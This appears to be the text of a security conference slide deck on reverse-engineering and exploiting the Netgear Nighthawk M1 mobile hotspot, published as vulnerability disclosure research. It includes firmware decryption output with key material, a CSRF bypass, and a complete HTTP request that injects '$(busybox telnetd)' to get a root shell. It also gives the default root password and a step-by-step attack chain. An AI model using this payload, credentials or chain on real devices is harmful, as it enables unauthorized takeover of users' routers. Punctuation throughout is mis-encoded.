Qualcomm MDM9250 (pretty new)
Netgear Nighthawk M1 - Hardware Highlights
Qualcomm MDM9250 (pretty new)
Nanya NM1484KSLAXAJ-3B 
combination NAND/RAM (sound 
familiar?)
Netgear Nighthawk M1 - Hardware Highlights
Qualcomm MDM9250 (pretty new)
Nanya NM1484KSLAXAJ-3B 
combination NAND/RAM (sound 
familiar?)
Generic looking test pads
USB-C interface
Netgear Nighthawk M1 - Who knows what?
Netgear Nighthawk M1 - What‚Äôs out there?
It‚Äôs kind of a challenge!
There‚Äôs lots of people getting pissed oÔ¨Ä 
at it on 4pda.ru forums.
There‚Äôs a ~300mb GPL tarball, patches 
for GPL* stuÔ¨Ä for Ô¨Årmware version 
‚Äú02.02_00‚Äù. Basically useless.
Netgear Nighthawk M1 - Where to start?
Every Ô¨Årmware Ô¨Åle looks 
encrypted.
No obvious legit way in.
Web server on TCP/80.
AT shell on (USB) TCP/5510.
Netgear Nighthawk M1 - What can we Ô¨Ågure out?
It‚Äôs Sierra Wireless based.
Probably really similar to the AirCard 
7XX or 8XX series (also Sierra Wireless 
based).
That opens a few small doors...
Netgear Nighthawk M1 - Fun fun fun
Netgear Nighthawk M1 - These things
Could be anything???
Some are 1.8V/3.3V? GPIOs???? UART???
One of them is 5V?? USB???
Some clever multiplexed something?!!
Netgear Nighthawk M1 - JTAG Works
Turns out they‚Äôre JTAG (thanks 
jtagenum!)
Connect with a J-Link as a generic 
Cortex M3. 
TCK
TDI
nTRST
TMS
TDO
RTCK
VREF
Netgear Nighthawk M1 - JTAG Works
$ xxd -r -p 0x0-.hex | strings -n8
San Diego1
CDMA Technologies1
QUALCOMM1
QPSA F4 TEST CA0
180328182825Z
380323182825Z0
SecTools Test User1
San Diego1
SecTools1
California1"0 
01 0000000000000000 SW_ID1"0 
02 0000000000000000 HW_ID1
04 0000 OEM_ID1
05 00000108 SW_SIZE1
06 0000 MODEL_ID1
07 0001 SHA2561"0 
03 0000000000000002 DEBUG0
California1
...
Netgear Nighthawk M1 - AT Shell
AT shell is kind of rubbish.
No privileged AT!ENTERCND 
mode.
No classic ADB-enabling AT 
commands.
AT!BOOTHOLD puts the thing 
into weird version of the 
Qualcomm Ô¨Çash mode
$ telnet 192.168.1.1 5510
Trying 192.168.1.1...
Connected to 192.168.1.1.
Escape character is '^]'.
ATI
ATI
Manufacturer: Netgear, Incorporated
Model: MR1100
Revision: NTG9X50C_12.06.03.00 r3480 ntgrbc-fwbuild2 
2018/10/12 11:29:56
IMEI: 359126080593965
IMEI SV: 10
FSN: 5D6389N600760
+GCAP: +CGSM,+DS,+ES
ERROR
AT!GIVEMEASHELLPLEASE
AT!GIVEMEASHELLPLEASE
ERROR
Netgear Nighthawk M1 - fdt.exe
Sierra Wireless fdt.exe can be used.
Found by unpacking other Sierra 
Wireless Ô¨Årmware install exes (use 7z).
Interface is pure USB rather than 
exposing a COM/TTY?
Also need AC78xSDrivers.exe
Firmware‚Äôs encrypted so not a
useful ‚Äúway in‚Äù.
Netgear Nighthawk M1 - Firmware Encryption
‚ÄúEncryption‚Äù
Netgear chose my favourite encryption.
Netgear Nighthawk M1 - Firmware Encryption
‚ÄúEncryption‚Äù
Netgear chose my favourite encryption.
(mainly)
Netgear Nighthawk M1 - Firmware Encryption
Mix of XOR and AES in ECB mode.
Firmware follows generic Sierra 
Wireless Ô¨Åle structure.
Chunk headers are AES ECB 
encrypted.
Chunk data is XOR (key start oÔ¨Äset 
by chunk size mod 32 for some 
reason?)
Netgear Nighthawk M1 - Firmware Encryption
AES ECB looks a lot like XOR.
Each block is encrypted in isolation.
Looks like 16-byte XOR key.
But it‚Äôs not.
Netgear Nighthawk M1 - Firmware Encryption
Netgear Nighthawk M1 - Firmware Encryption
Wrote a script to do it.
https://ptp.sh/netgear_m1
Netgear Nighthawk M1 - Firmware Encryption
$ python netgear_fwtool.py ../MR1100-100EUS_23113509_NTG9x50C_12.06.03.00_00_Generic_05.01.secc.spk
[LOG] using file MR1100-100EUS_23113509_NTG9x50C_12.06.03.00_00_Generic_05.01.secc.spk
[LOG] file is 0x6856c23 long
[LOG] chunk start: 0x190, length 0x579f0, end 0x57b80
[DBG] (len-header % 32: 0?)
[DBG] key start: , key end: c9c9bcbf53914ffbb180b0c366db1743b8cd9aafdacba3ffd099e28a2dd2f2ac
[LOG] chunk start: 0x57b80, length 0x22dacd0, end 0x2332850
[DBG] (len-header % 32: 0?)
[DBG] key start: , key end: c9c9bcbf53914ffbb180b0c366db1743b8cd9aafdacba3ffd099e28a2dd2f2ac
[LOG] chunk start: 0x2332850, length 0x34cbb6a, end 0x57fe3ba
[DBG] (len-header % 32: 26?)
[DBG] key start: 4ffbb180b0c366db1743b8cd9aafdacba3ffd099e28a2dd2f2ac, key end: c9c9bcbf5391
[LOG] chunk start: 0x57fe3ba, length 0x1000190, end 0x67fe54a
[DBG] (len-header % 32: 0?)
[DBG] key start: , key end: c9c9bcbf53914ffbb180b0c366db1743b8cd9aafdacba3ffd099e28a2dd2f2ac
[LOG] chunk start: 0x67fe54a, length 0xc3c4, end 0x680a90e
[DBG] (len-header % 32: 20?)
[DBG] key start: 66db1743b8cd9aafdacba3ffd099e28a2dd2f2ac, key end: c9c9bcbf53914ffbb180b0c3
[LOG] chunk start: 0x680a90e, length 0x4c315, end 0x6856c23
[DBG] (len-header % 32: 5?)
[DBG] key start: 8a2dd2f2ac, key end: c9c9bcbf53914ffbb180b0c366db1743b8cd9aafdacba3ffd099e2
[DBG] starting chunk 0_0x190-0x57b80
[LOG] MAIN TYPE: BOOT
[LOG] decrypting chunk body...
...
Netgear Nighthawk M1 - Firmware Encryption
The Ô¨Årmware‚Äôs massive & full of 
interesting stuÔ¨Ä.
BOOT = Bootloader
MODM = Qualcomm DSP, TZ, RPM
APPL = Linux system applications
HDAT = /mnt/hdata = webapp root
SPLA = Android splashscreen
FILE = Generic global APN conÔ¨Ågs
Netgear Nighthawk M1 - The Bugs
Netgear Nighthawk M1 - CSRF Bypass
Netgear Nighthawk M1 - CSRF Bypass
This is my favourite CSRF bypass of all time.
MOST conÔ¨Åg/mutable info is pulled from dynamically-generated JSON 
Ô¨Åles (not JSONP so can‚Äôt siphon cross-site)
But JavaScript Ô¨Åle NetgearStrings.js is ALSO dynamically generated. 
There‚Äôs a TODO comment right at the top.
Netgear Nighthawk M1 - CSRF Bypass
Netgear Nighthawk M1 - Command Injection again
Netgear Nighthawk M1 - Web Interface Black Box
All requests which ‚Äúdo something‚Äù are made to 
/Forms/* API endpoints.
-
/Forms/config
-
/Forms/multiCfg
-
...etc
Important parameters are sessionId cookie, 
CSRF token, and a named conÔ¨Åguration 
parameter (in the format group.thing or 
group.thing.something)
Netgear Nighthawk M1 - Basic API Call Format
POST /Forms/config HTTP/1.1
Host: 192.168.1.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 
Firefox/60.0
Accept: */*
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://192.168.1.1/index.html
Content-type: application/x-www-form-urlencoded
Content-Length: 113
Cookie: sessionId=0000000d-bW1XS27NZzc39egmHaPFXRP9vuZl3wp
Connection: close
general.shutdown=restart&err_redirect=/error.json&ok_redirect=/success.json& t
oken=k8BKKSfEUxxMlrrFaCyQgGuTMGRSbnl
Netgear Nighthawk M1 - Instrospection.html
/Introspection.html
Netgear Nighthawk M1 - Command Injection
POST /Forms/config HTTP/1.1
Host: 192.168.1.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 
Firefox/60.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://192.168.1.1/index.html
Content-type: application/x-www-form-urlencoded
Content-Length: 143
Cookie: sessionId=00000008-8CKtg8jB5TJ0WhJALlbTXIdplP9wDZs
Connection: close
ready.deviceShare.removeUsbDevice=;$(busybox telnetd);
&err_redirect=/error.json&ok_redirect=/success.json&token=kMOvNyZv6Jh4dHTOEL
KhMGuBNMUlXZ6
Netgear Nighthawk M1 - Command Injection
$ telnet 192.168.1.1
Trying 192.168.1.1...
Connected to 192.168.1.1.
Escape character is '^]'.
msm 201810121151 mdm9650
mdm9650 login: root
Password: 
root@mdm9650:~# 
Default creds are root:oelinux123
Nice clean root shell on it, for further fun!
Netgear Nighthawk M1 - Chaining
You can chain these in a similar way to the MF910
No auth bypass yet though, so not as clean. 
1.
Grab CSRF token from NetgearStrings.js.
2.
Cross-site login/brute-force password.
3.
Check user privilege by reloading NetgearStrings.js.
4.
Post-auth command injection if priv = Admin
Netgear Nighthawk M1 - More reading
More stuÔ¨Ä, written down:
https://ptp.sh/netgear_m1
So what?
Summary - Code reuse/where‚Äôs it from?
Vendors should be asking ‚Äúwhere else is code from that device running?‚Äù
ZTE didn‚Äôt do this.
Netgear are running Sierra Wireless tech in their devices.
Issues might aÔ¨Äect other vendors/similar devices using save dev stack.
Summary - Some vendors are hard work
Netgear are rubbish to disclose to.
We reported issues in February. If they‚Äôre not Ô¨Åxed by now then ü§∑
Don‚Äôt consider post-auth RCE serious. 
Aren‚Äôt going to Ô¨Åx the encryption issues. 
But they will change the root password apparently? üíÅ
Lots of people to thank, some I know & some I don‚Äôt
The Pen Test Partners and other people working there, Jamie Riden who doesn‚Äôt any more.
Everyone on the Netgear M1 on 4pda.ru: https://4pda.ru/forum/index.php?showtopic=778715
Further reading
ZTE, Netgear & a TP-Link issue I didn‚Äôt talk about today at:
https://ptp.sh/dc27_4g